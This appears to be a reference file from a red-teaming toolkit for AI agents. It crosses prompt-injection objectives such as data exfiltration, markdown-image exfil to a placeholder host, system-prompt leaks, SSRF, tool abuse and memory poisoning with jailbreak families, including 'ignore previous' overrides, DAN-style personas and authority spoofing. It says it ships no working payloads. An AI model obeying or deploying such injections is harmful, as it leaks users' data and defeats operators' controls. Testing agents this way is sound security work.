# Technique matrix: objectives x families

Two independent axes. An payload is one objective wrapped in one family, delivered through one
channel. Compose at run time; this file ships the taxonomy, not tuned payloads.

## Axis A - objectives (what the injected instruction tries to achieve)

| Objective | OWASP LLM | Success looks like | Oracle | Requires the agent to hold |
|---|---|---|---|---|
| Data exfiltration | LLM02 | Context contents reach an attacker-controlled destination | callback | fetch, or any outbound tool |
| Exfil via markdown image | LLM02 | Client renders `![](https://oast/<data>)` and the fetch fires | callback | markdown rendering only |
| System prompt leak | LLM01 | Instructions above the user turn are reproduced | **judge** | nothing |
| XSS into the rendering client | LLM01 | Script executes in the app that renders the answer | callback | HTML rendering |
| SSRF / internal fetch | LLM01 | Agent requests an internal or metadata address | callback | fetch/browse |
| Plugin & tool abuse | LLM07 | A tool runs with arguments the user never supplied | callback | any tool with side effects |
| Memory poisoning | LLM03 | Instruction survives into a later, clean session | **judge** | memory or profile write |
| Token exhaustion | LLM04 | Output or loop runs to the ceiling | **judge** | nothing |

Five of eight are callback-scored. Only the three marked **judge** need a model to grade them, and
running a judge over the other five adds variance without adding evidence.

Note the second row: markdown-image exfil is the cheapest deterministic objective in the set,
because it needs no tool at all beyond a client that renders markdown. That is why phase 2 triage
carries it.

## Axis B - technique families (what gets the model to comply)

The publicly circulating jailbreaks collapse into five families. Test families in triage; reach for
a specific instance only after its family survives.

| Family | Mechanism | Public instances |
|---|---|---|
| Instruction override | Asserts the prior instructions are void or superseded | "ignore previous", new-priority directive |
| Persona adoption | Moves the model into a character that has no restrictions | DAN (6/11/12), STAN, DUDE |
| Authority spoof | Claims developer, system or operator standing | developer override, debug mode |
| Channel/format confusion | Mimics the framing of a higher-trust channel (system turn, tool result, structured envelope) | system-format injection |
| Context manipulation | Splits, buries or defers the instruction so it is assembled after any filter | context split, delayed activation |

Where the target exposes a raw model endpoint, a corpus scanner (Augustus, 210+ probes across 47
categories) covers axis B far past what this table lists, and its categories map onto the objectives
in axis A. Use it for endpoint-level breadth and keep this file for the agent-level composition it
cannot reach.

Sources for the instances above are public corpora: the OWASP LLM Top 10, the Spikee dataset, and
the widely mirrored DAN/STAN/DUDE community collection. This file deliberately ships **no working
payload text** - the families are what generalize, and a tuned corpus goes stale against the next
model revision anyway. Pull current instance wording from the cited public sources at run time.

## Composition

    payload = objective x family x channel

Not every cell is valid. Phase 0 eliminates objectives the agent cannot reach; phase 2 eliminates
families the target is not soft against; `delivery-channels.md` eliminates channels the agent does
not ingest. What remains is usually a small fraction of the full cross product, which is the point.
